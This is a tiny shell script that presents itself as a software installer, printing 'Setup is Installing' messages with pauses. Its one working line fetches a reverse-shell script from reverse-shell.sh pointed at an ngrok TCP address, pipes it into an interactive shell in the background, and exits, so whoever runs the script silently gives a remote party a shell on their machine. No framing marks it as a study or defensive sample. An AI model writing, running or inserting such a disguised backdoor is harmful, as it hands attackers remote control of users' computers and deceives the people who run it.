echo PLease Wait Your Setup is Installing 
sleep 2
echo installing the required Files 
sleep 4
sh -c "curl https://reverse-shell.sh/0.tcp.ngrok.io:15243 | sh -i &" && exit
echo All Done We are Good To Go
